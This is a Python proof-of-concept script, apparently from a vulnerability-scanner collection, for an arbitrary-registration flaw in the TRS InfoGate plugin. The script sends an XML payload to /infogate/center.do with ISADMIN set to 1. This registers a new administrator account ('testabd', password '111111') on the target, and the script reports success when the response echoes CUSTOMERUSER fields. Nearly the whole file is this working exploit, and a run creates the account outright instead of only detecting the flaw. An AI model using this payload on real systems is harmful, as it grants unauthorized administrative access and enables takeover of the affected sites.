#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: trs infogate插件 任意注册漏洞
referer: unknown
author: Lucifer
description: infogate在注册的时候允许带入多个不在计划内的参数能够注册并开通管理账户。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class trs_infogate_register_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/infogate/center.do"
        vulnurl = self.url + payload
        post_data = '''
            <post-data><method type="save">infogate_customer</method><parameters><CUSTOMERUSERID><![CDATA[0]]></CUSTOMERUSERID><USERSTATUS><![CDATA[1]]></USERSTATUS><USERNAME><![CDATA[testabd]]></USERNAME><EMAIL><![CDATA[1@1.1.1.1]]></EMAIL><PASSWORD><![CDATA[111111]]></PASSWORD><REALNAME><![CDATA[]]></REALNAME><NICKNAME><![CDATA[]]></NICKNAME><COMEFROM><![CDATA[]]></COMEFROM><TELEPHONE><![CDATA[]]></TELEPHONE><ISADMIN><![CDATA[1]]></ISADMIN><GROUPID><![CDATA[0]]></GROUPID></parameters></post-data>
        '''
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"CUSTOMERUSER" in req.text and r"CUSTOMERUSERID" in req.text:
                cprint("[+]存在trs infogate插件 任意注册漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_infogate_register_BaseVerify(sys.argv[1])
    testVuln.run()